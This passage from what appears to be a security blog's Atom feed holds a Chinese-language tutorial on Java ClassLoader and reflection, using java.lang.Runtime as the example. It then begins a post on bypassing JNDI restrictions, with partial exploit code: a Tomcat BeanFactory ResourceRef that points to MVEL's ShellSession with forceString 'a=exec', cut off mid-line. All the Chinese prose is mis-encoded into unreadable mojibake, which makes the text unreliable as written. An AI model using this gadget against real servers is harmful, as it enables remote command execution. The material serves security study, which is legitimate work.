keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> extensionClassLoader <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App Classloader: "</span> <span class="token operator">+</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The parent of parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œç»“æœ:</p><pre class="line-numbers language-none"><code class="language-none">App Classloader: sun.misc.Launcher$AppClassLoader@18b4aac2parent Classloader: sun.misc.Launcher$ExtClassLoader@5cad8086The parent of parent Classloader: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ClassLoader</code>ç±»æœ‰å¦‚ä¸‹å¸¸è§çš„æ–¹æ³•:</p><ul><li><code>loadClass</code>:å‚æ•°ä¸ºéœ€è¦åŠ è½½çš„å…¨é™å®šç±»åï¼Œè¯¥æ–¹æ³•ä¼šå…ˆæŸ¥çœ‹ç›®æ ‡ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼ŒæŸ¥çœ‹çˆ¶çº§åŠ è½½å™¨å¹¶é€’å½’è°ƒç”¨<code>loadClass()</code>ï¼Œå¦‚æœéƒ½æ²¡æ‰¾åˆ°åˆ™è°ƒç”¨<code>findClass()</code>ã€‚è¿™ç§å¯»æ‰¾ç±»çš„æ–¹å¼ç§°ä¸º<a href="https://www.cnblogs.com/JonaLin/p/12674114.html">åŒäº²å§”æ´¾æœºåˆ¶(delegation model)</a>,ä¸»è¦æ˜¯ä¸ºäº†å®‰å…¨æ€§ï¼Œé¿å…ç”¨æˆ·è‡ªå·±ç¼–å†™çš„ç±»åŠ¨æ€æ›¿æ¢Javaçš„ä¸€äº›æ ¸å¿ƒç±»ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†é‡å¤åŠ è½½ã€‚<br><img src="/2022/03/22/java-reflection/1.png"><br>åŒäº²å§”æ´¾ï¼š<br><img src="/2022/03/22/java-reflection/2.png"></li><li><code>findClass</code>: æœç´¢ç±»çš„ä½ç½®ï¼Œä¸€èˆ¬ä¼šæ ¹æ®åç§°æˆ–ä½ç½®åŠ è½½.classå­—èŠ‚ç æ–‡ä»¶ï¼Œè·å–å­—èŠ‚ç æ•°ç»„ï¼Œç„¶åè°ƒç”¨defineClass()ã€‚</li><li><code>findloadedClass</code>: æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»</li><li><code>defineClass</code>: å°†å­—èŠ‚ç è½¬æ¢ä¸ºJVMçš„<code>java.lang.Class</code>å¯¹è±¡</li></ul><p>ä»£ç ä¸­å…³äº<code>defineClass</code>è¿˜æ˜¯æ¯”è¾ƒå€¼å¾—ä¸€çœ‹ï¼Œ<code>loadClass</code>çš„ä½œç”¨æ˜¯åŠ è½½Classæ–‡ä»¶ï¼Œè½¬æ¢ä¸ºå­—èŠ‚ç ï¼Œå½“classä¸æ˜¯åœ¨æ–‡ä»¶é‡Œé¢ï¼Œè€Œæ˜¯ä»å…¶å®ƒæ¥æºçš„æ—¶å€™ï¼Œæ¯”å¦‚ç½‘ç»œè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™å°±è½®åˆ°<code>defineClass</code>ä¸Šåœºäº†ï¼Œ<code>defineClass</code>è´Ÿè´£æŠŠbyte[]ç›´æ¥è½¬æ¢ä¸ºClassï¼Œä¹Ÿå°±æ˜¯è¯´<code>defineClass</code>æ˜¯å¯¹ç±»åŠ è½½æ–¹å¼çš„æ‰©å±•: </p><blockquote><p> However, some classes may not originate from a file; they may originatefrom other sources, such as the network, or they could be constructed by anapplication.  The method {@link #defineClass(String, byte[], int, int)<tt>defineClass</tt>} converts an array of bytes into an instance of class<tt>Class</tt>. Instances of this newly defined class can be created using{@link Class#newInstance <tt>Class.newInstance</tt>}.</p></blockquote><h2 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h2><h4 id="è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•"><a href="#è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•" class="headerlink" title="è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•"></a>è·å–Classå¯¹è±¡çš„å››ç§æ–¹æ³•</h4><p>åå°„çš„ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡Classå¯¹è±¡æ¥å¯¹ç±»çš„å±æ€§å’Œæ–¹æ³•è¿›è¡Œè·å–å’Œè°ƒç”¨ï¼ŒåŒ…æ‹¬ç±»çš„ç§æœ‰æ–¹æ³•ï¼ˆprotectedå’Œprivateï¼‰ï¼Œä¸€èˆ¬æ¥è¯´æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è·å–ç±»ï¼š</p><ol><li><code>obj.getClass()</code>: å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ obj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡<code>obj.getClass()</code>æ¥è·å–å®ƒçš„ç±» <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span> obj <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><code>Class.forName</code>:  <code>Class c= Class.forName(&quot;java.lang.Runtime&quot;);</code></li><li><code>ClassLoader</code>: <code>Class clazz = Classloader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code></li><li>åŸç”Ÿç±».class: <code>Class clazz  = java.lang.Runtime.class;</code></li></ol><p><code>forName</code>æœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code><br>ç¬¬â¼€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸â»…çš„è·å–classçš„â½…å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token comment">// ç­‰äº</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> currentLoader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2022/03/22/java-reflection/6.png"><br>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>forName</code>çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯<code>ClassLoader</code>ã€‚</li></ul><h2 id="åå°„è°ƒç”¨å‡½æ•°"><a href="#åå°„è°ƒç”¨å‡½æ•°" class="headerlink" title="åå°„è°ƒç”¨å‡½æ•°"></a>åå°„è°ƒç”¨å‡½æ•°</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">student</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"D"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"My name is "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">", My Age is "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        student<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//åå°„è°ƒç”¨Student</span>        <span class="token class-name">String</span> class_name <span class="token operator">=</span> <span class="token string">"student.Student"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> func <span class="token operator">=</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> stu_class <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> stu2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span> stu_class<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>stu2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>getDeclaredMethod()</code>: Returns a Method object that reflects the specified declared method of the class or interface represented by this Class object.</li><li><code>getMethod()</code>:         returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.</li></ul><p><code>getDeclaredMethod()</code>å¯ä»¥è·å–ç±»é‡Œé¢ä»»ä½•æ–¹æ³•ï¼Œ<code>getMethod()</code>åªå¯ä»¥è·å–<code>public</code>å±æ€§çš„æ–¹æ³•ã€‚å¦å¤–å‡ ä¸ªæ¯”è¾ƒç”¨çš„å¤šæ˜¯æ˜¯:</p><ul><li><code>getField(String name)</code>: æ ¹æ®å­—æ®µåè·å–å¯¹åº”çš„å­—æ®µï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œå¯ä»¥è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getFields()</code>: è·å–ç±»æ‰€æœ‰çš„å­—æ®µï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œå¯ä»¥è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getDeclaredField(String name)</code>: æ ¹æ®å­—æ®µåè·å–å¯¹åº”çš„å­—æ®µï¼Œå¯ä»¥è·å–publicã€protectedå’Œprivateç±»å‹çš„å­—æ®µï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li><li><code>getDeclaredFields()</code>: è·å–ç±»æ‰€æœ‰çš„å­—æ®µï¼ŒåŒ…æ‹¬publicã€protectedå’Œprivateã€‚ä¸èƒ½è·å–çˆ¶ç±»çš„å­—æ®µã€‚</li></ul><h4 id="é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡"><a href="#é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡" class="headerlink" title="é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡"></a>é€šè¿‡åå°„è·å–ä¿®æ”¹ç§æœ‰å˜é‡</h4><p><img src="/2022/03/22/java-reflection/7.png"></p><p><strong>å¦‚æœå­—æ®µæ˜¯staicä¿®é¥°çš„æ—¶å€™ï¼Œåœ¨è·å–å’Œä¿®æ”¹å­—æ®µçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨nullä»£æ›¿å…·ä½“å¯¹è±¡çš„stu</strong></p><h4 id="é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"><a href="#é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•" class="headerlink" title="é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•"></a>é€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ–¹æ³•</h4><p><img src="/2022/03/22/java-reflection/8.png"></p><p>å¦‚æœè°ƒç”¨çš„æ–¹æ³•æœ‰å¤šä¸ªå‚æ•°ï¼Œéœ€è¦ä»¥æ•°ç»„çš„å½¢å¼ä¼ å…¥ï¼š<br><img src="/2022/03/22/java-reflection/9.png"></p><ul><li>ä½¿ç”¨<code>getDeclaredMethod</code>è·å–å¤šä¸ªå‚æ•°çš„æ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºnew Class[]{}ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„ä¸­æ¯ä¸€ä¸ªå€¼å¯¹åº”å‚æ•°çš„classå¯¹è±¡ã€‚è¿™æ˜¯ä¸€ç§æ ‡å‡†çš„ä¼ å‚æ–¹å¼ï¼Œå»ºè®®å³ä½¿æ–¹æ³•æ²¡æœ‰å‚æ•°æˆ–è€…åªæœ‰ä¸€ä¸ªå‚æ•°ä¹ŸæŒ‰ç…§è¿™ç§æ–¹å¼ä¼ å‚</li><li>ä½¿ç”¨<code>method.invoke</code>æ–¹æ³•å¯¹æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œä¼ é€’çš„ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå®é™…è°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°å€¼ï¼Œç±»å‹æ˜¯Objectæ•°ç»„ã€‚<br>å¯¹äºstaticç±»å‹çš„æ–¹æ³•ï¼Œä¸å­—æ®µçš„ä½¿ç”¨æ–¹æ³•ç›¸ä¼¼ï¼Œåœ¨æ‰§è¡Œæ–¹æ³•æ—¶ï¼ŒåŒæ ·å¯ä»¥æŠŠobjå¯¹è±¡æ¢æˆnull</li></ul><h4 id="åå°„è·å–æ„é€ å‡½æ•°"><a href="#åå°„è·å–æ„é€ å‡½æ•°" class="headerlink" title="åå°„è·å–æ„é€ å‡½æ•°"></a>åå°„è·å–æ„é€ å‡½æ•°</h4><p>æ„é€ å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦é€šè¿‡åå°„è·å–æ„é€ å‡½æ•°ï¼Œç„¶åé€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆç±»çš„å®ä¾‹ã€‚</p><ul><li><code>getConstructor(Class... parameterTypes)</code> æ ¹æ®å‚æ•°ç±»å‹è·å–å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½è·å–publicç±»å‹çš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getConstructors()</code> è·å–ç±»æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½è·å–publicç±»å‹çš„å­—æ®µï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getDeclaredConstructor (Class... parameterTypes)</code> æ ¹æ®å‚æ•°ç±»å‹è·å–å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥è·å–publicã€protectedå’Œprivateç±»å‹çš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li><li><code>getDeclaredConstructors()</code> è·å–ç±»æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼ŒåŒ…æ‹¬publicã€protectedå’Œprivateã€‚ä¸èƒ½è·å–çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚</li></ul><p>åœ¨è·å–åˆ°æ„é€ å‡½æ•°ä¹‹åï¼Œéœ€è¦é€šè¿‡newInstanceå‡½æ•°æ¥ç”Ÿæˆç±»å¯¹è±¡ã€‚å…³äºnewInstanceçš„ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li><code>newInstance(Object ... initargs)</code>: newInstanceå‡½æ•°æ¥å—å¯å˜çš„å‚æ•°ä¸ªæ•°ï¼Œæ„é€ å‡½æ•°å®é™…æœ‰å‡ ä¸ªä¼ è¾“ï¼Œè¿™é‡Œå°±ä¼ é€’å‡ ä¸ªå‚æ•°å€¼ã€‚newInstanceè¿”å›çš„æ•°æ®ç±»å‹æ˜¯Objectï¼Œä¸€èˆ¬éœ€è¦å¼ºåˆ¶è½¬æ¢ç±»å‹ã€‚</li></ul><p><img src="/2022/03/22/java-reflection/10.png"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://javasec.org/javase/Reflection/Reflection.html">javasec.org</a></li><li><a href="https://www.freebuf.com/articles/web/308460.html">Javaä»£ç å®¡è®¡ä¹‹åå°„</a></li><li><a href="https://github.com/phith0n/JavaThings">Javaå®‰å…¨æ¼«è°ˆ</a></li><li><a href="https://xz.aliyun.com/t/9002">JAVAå®‰å…¨åŸºç¡€</a></li><li><a href="https://xz.aliyun.com/t/7029/">JAVAååºåˆ—åŒ– - åå°„æœºåˆ¶</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483830&idx=1&sn=39c08c61cbab36ace4ac691e0756948b&chksm=c2a1d53ff5d65c29f9b8310c324c67568fe27e61720baffff8af19ef9cb94f5096d73df0c69f">å‘Šåˆ«è„šæœ¬å°å­ç³»åˆ—ä¸¨JAVAå®‰å…¨(3)â€”â€”JAVAåå°„æœºåˆ¶</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-ç±»åŠ è½½å™¨-ClassLoader&quot;&gt;&lt;a href=&quot;#0x1-ç±»åŠ è½½å™¨-ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;0x1. ç±»åŠ è½½å™¨: ClassLoader&quot;&gt;&lt;/a&gt;0x1. ç±»åŠ è½½å™¨: ClassLoader&lt;/h2&gt;&lt;p&gt;Javaæ˜¯ä¸€ä¸ªä¾èµ–äº&lt;code&gt;JVMï¼ˆJavaè™šæ‹Ÿæœº)&lt;/code&gt;å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ï¼Œ&lt;code&gt;Java&lt;/code&gt;ä¼šå…ˆé€šè¿‡ç¼–è¯‘å™¨å°†æºä»£ç è½¬æ¢ä¸ºJavaäºŒè¿›åˆ¶å­—èŠ‚ç ï¼Œä¸€èˆ¬æ˜¯ä¿å­˜åœ¨&lt;code&gt;.class&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œä¹‹åé€šè¿‡&lt;code&gt;JVM&lt;/code&gt;è§£é‡Šå™¨æ‰§è¡Œè¿™æ®µä»£ç ã€‚å­—èŠ‚ç æ–‡ä»¶ä¼šåŒ…å«å¾ˆå¤šClassä¿¡æ¯ï¼Œåœ¨JVMè§£é‡Šå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ&lt;code&gt;ClassLoader&lt;/code&gt;å°±æ˜¯ç”¨æ¥åŠ è½½ç±»çš„ï¼Œå®ƒä¼šå°†Javaå­—èŠ‚ç ä¸­çš„ClassåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œæ¯ä¸ª&lt;code&gt;Class&lt;/code&gt;å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ª&lt;code&gt;ClassLoader&lt;/code&gt;å±æ€§æ ‡è¯†ç”±å“ªä¸ª&lt;code&gt;ClassLoader&lt;/code&gt;åŠ è½½ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å¸¸è§çš„ClassLoader&quot;&gt;&lt;a href=&quot;#å¸¸è§çš„ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;å¸¸è§çš„ClassLoader&quot;&gt;&lt;/a&gt;å¸¸è§çš„ClassLoader&lt;/h3&gt;&lt;p&gt;ä¸€åˆ‡çš„&lt;code&gt;Java&lt;/code&gt;ç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½ä¹‹åæ‰å¯ä»¥è¿è¡Œï¼Œæœ€å¸¸è§çš„&lt;code&gt;ClassLoader&lt;/code&gt;ï¼š &lt;code&gt;BootstrapClassLoader&lt;/code&gt;ã€&lt;code&gt;ExtensionClassLoader&lt;/code&gt;ã€&lt;code&gt;AppClassLoader&lt;/code&gt;ã€&lt;code&gt;URLClassLoader&lt;/code&gt;ã€&lt;code&gt;ContextClassLoader&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;BootstrapClassLoader&quot;&gt;&lt;a href=&quot;#BootstrapClassLoader&quot; class=&quot;headerlink&quot; title=&quot;BootstrapClassLoader&quot;&gt;&lt;/a&gt;BootstrapClassLoader&lt;/h4&gt;&lt;p&gt;JVMå†…ç½®çš„é»˜è®¤&lt;code&gt;classLoader&lt;/code&gt;,è´Ÿè´£åŠ è½½JVMè¿è¡Œæ—¶çš„æ ¸å¿ƒç±»ï¼Œä½äº&lt;code&gt;JAVA_HOME/lib/rt.jar/&lt;/code&gt;æ–‡ä»¶å¤¹ä¸­ï¼Œç”±Cä»£ç å®ç°ï¼Œ&lt;code&gt;Bootstrap ClassLoader&lt;/code&gt;ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›null&lt;/p&gt;
&lt;h4 id=&quot;ExtClassLoader&quot;&gt;&lt;a href=&quot;#ExtClassLoader&quot; class=&quot;headerlink&quot; title=&quot;ExtClassLoader&quot;&gt;&lt;/a&gt;ExtClassLoader&lt;/h4&gt;&lt;p&gt;æ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº &lt;code&gt;JAVA_HOME/lib/ext/*.jar&lt;/code&gt; ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´&lt;/p&gt;
&lt;h4 id=&quot;AppClassLoader&quot;&gt;&lt;a href=&quot;#AppClassLoader&quot; class=&quot;headerlink&quot; title=&quot;AppClassLoader&quot;&gt;&lt;/a&gt;AppClassLoader&lt;/h4&gt;&lt;p&gt;åº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½&lt;code&gt;ClASSPATH&lt;/code&gt;ç¯å¢ƒå˜é‡æˆ–è€…&lt;code&gt;java.class.path&lt;/code&gt;å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„jaråŒ…å’Œç›®å½•ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™å’Œä½¿ç”¨çš„ç¬¬ä¸‰æ–¹JaråŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>JNDI Bypass - MVEL</title>
    <link href="https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html"/>
    <id>https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T06:53:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æµ‹è¯•èƒŒæ™¯"><a href="#æµ‹è¯•èƒŒæ™¯" class="headerlink" title="æµ‹è¯•èƒŒæ™¯"></a>æµ‹è¯•èƒŒæ™¯</h2><p>JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h2><p>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token 